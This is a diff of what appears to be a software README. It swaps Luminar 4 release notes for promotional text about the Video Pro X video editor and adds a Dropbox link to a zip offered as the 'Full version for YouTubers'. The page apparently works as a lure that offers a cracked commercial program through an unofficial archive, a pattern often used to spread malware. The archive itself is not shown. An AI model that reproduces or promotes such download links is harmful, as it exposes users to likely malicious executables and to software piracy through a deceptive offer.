@@ -11,21 +11,13 @@
 * Disk space - 10 GB free space
 
 ![alt-текст](https://i.imgur.com/HlgzBru.png "Video Pro X")
+## PROFESSIONAL VIDEO EDITING FOR EVERYONE Video Pro X is the only video editing software that makes professional video production accessible for everyone. With intuitive editing tools and workflows, getting started with Video Pro X is easier than with any other professional video editor. The new video engine allows for seamless, uninterrupted editing of high-resolution 4K Ultra HD material on any PC.
 
-## Luminar 4's revolutionary tools and AI technologies give superpowers for creative photo editing.
+## Video Pro X has always stood for technological innovation above and beyond industry standard. 
+## Discover resolutions in up to 8K UltraHD, HDR color space and latest film studio effects, and achieve professional results. The powerful video engine means that video editing is absolutely smooth, even for complex multi-track projects.
 
-## [⚡️Luminar Version 4.4](https://i.imgur.com/HlgzBru.png):
-* NEW AI Augmented Sky Tool.
-* Face Features Detection Network.
-* Shine Removal Technology.
-* Slim Face 2.0 Technology.
-* Relight Scene technology improvement.
-* Improvements to ML Cache.
-* Third-party Plugin Implementation (PC users).
+## [⚡️Video Pro X [Full version for YouTubers](https://www.dropbox.com/s/563fgau7pi89013/Video%20Pro%20X.zip?dl=1):
 
-## ⚡️Luminar Version 4.3:
 
-* Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays, and digital cinema uses.
-* Resetting tools is easier with an increased clickable area for each reset button.
-* The History tool is easier to use thanks to a redesigned interface with larger text.
-* The Histogram is more compact, with an improved contrast ratio. This makes it easier to use when editing your photos. If you don’t see the Histogram when editing, you can activate it with the View menu.
+
+
